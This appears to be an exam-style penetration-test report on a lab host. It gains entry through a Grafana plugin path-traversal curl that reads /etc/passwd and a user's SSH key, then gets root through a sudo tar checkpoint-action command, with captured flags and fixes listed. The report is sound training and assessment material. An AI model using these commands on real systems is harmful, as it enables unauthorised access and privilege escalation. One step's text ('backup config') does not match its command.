{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-web:foothold"},"content":[{"type":"text","text":"Initial access"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability Explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" The plugin asset route of Grafana 8.0.0 to 8.3.0 does not normalise the path, so any file the grafana user can read is served without logging in. dev's private SSH key was readable."}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability Fix:","marks":[{"type":"bold"}]}]}
{"type":"list","attrs":{"kind":"bullet"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Upgrade Grafana to 8.3.1 or later."}]}]}
{"type":"list","attrs":{"kind":"bullet"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Keep SSH private keys readable by their owner only."}]}]}
{"type":"paragraph","content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)"}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","content":[{"type":"text","text":"I read the backup config through the LFI first."}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-passwd:0:command"},"content":[{"type":"text","text":"curl --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-passwd:0:output"},"content":[{"type":"text","text":"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\\ndev:x:1000:1000:dev,,,:/home/dev:/bin/bash\\ngrafana:x:113:118::/usr/share/grafana:/bin/false"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-key:0:command"},"content":[{"type":"text","text":"curl -s --path-as-is http://10.10.30.20:3000/public/plugins/alertlist/../../../../../../../../home/dev/.ssh/id_rsa -o dev_id_rsa && head -3 dev_id_rsa"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-key:0:output"},"content":[{"type":"text","text":"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAYEAs2N0aGV0aWMta2V5LWZvci1hbi1hdWRpdC1maXh0dXJlLW9ubHkA"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-ssh:0:command"},"content":[{"type":"text","text":"chmod 600 dev_id_rsa && ssh -i dev_id_rsa dev@10.10.30.20"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-ssh:0:output"},"content":[{"type":"text","text":"Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)\\n\\nLast login: Tue Nov  3 09:14:52 2026 from 10.10.30.254\\ndev@web01:~$ id\\nuid=1000(dev) gid=1000(dev) groups=1000(dev)"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say where you read the flag"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-local:proof"},"content":[{"type":"text","text":"dev@web01:~$ cat local.txt\\n9b2e4f61c0d87a35e1f4b6c9d2a0e7f3\\ndev@web01:~$ id\\nuid=1000(dev) gid=1000(dev) groups=1000(dev)\\ndev@web01:~$ hostname\\nweb01\\ndev@web01:~$ ip addr\\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\\n    inet 127.0.0.1/8 scope host lo\\n2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\\n    link/ether 00:50:56:8a:4c:1e brd ff:ff:ff:ff:ff:ff\\n    inet 10.10.30.20/24 brd 10.10.30.255 scope global ens160"}]},{"type":"figure","attrs":{"attachmentId":"a-web01-local","entryId":"l-exam-web01-local","source":"entry:l-exam-web01-local"},"content":[{"type":"text","text":"local.txt"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-web:privesc"},"content":[{"type":"text","text":"Privilege escalation"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability Explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" dev may run /usr/bin/tar as root without a password. tar's --checkpoint-action runs any command."}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability Fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Remove the sudo rule, or replace it with a wrapper script that takes no arguments."}]}
{"type":"paragraph","content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" High"}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-sudo:0:command"},"content":[{"type":"text","text":"sudo -l"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-sudo:0:output"},"content":[{"type":"text","text":"Matching Defaults entries for dev on web01:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\n\\nUser dev may run the following commands on web01:\\n    (root) NOPASSWD: /usr/bin/tar"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say what this step does"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-tar:0:command"},"content":[{"type":"text","text":"sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-tar:0:output"},"content":[{"type":"text","text":"/usr/bin/tar: Removing leading \`/' from member names\\nroot@web01:/home/dev# id\\nuid=0(root) gid=0(root) groups=0(root)"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-web:post"},"content":[{"type":"text","text":"Post-exploitation"}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"hint":"Say where you read the flag"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-web01-proof:proof"},"content":[{"type":"text","text":"root@web01:~# cat /root/proof.txt\\ne4da3b7fbbce2345d7772b0674a318d5\\nroot@web01:~# id\\nuid=0(root) gid=0(root) groups=0(root)\\nroot@web01:~# hostname\\nweb01\\nroot@web01:~# ip addr\\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\\n    inet 127.0.0.1/8 scope host lo\\n2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\\n    link/ether 00:50:56:8a:4c:1e brd ff:ff:ff:ff:ff:ff\\n    inet 10.10.30.20/24 brd 10.10.30.255 scope global ens160"}]},{"type":"figure","attrs":{"attachmentId":"a-web01-proof","entryId":"l-exam-web01-proof","source":"entry:l-exam-web01-proof"},"content":[{"type":"text","text":"proof.txt"}]},{"type":"paragraph","content":[{"type":"text","text":"Root shell on web01"}]}]}
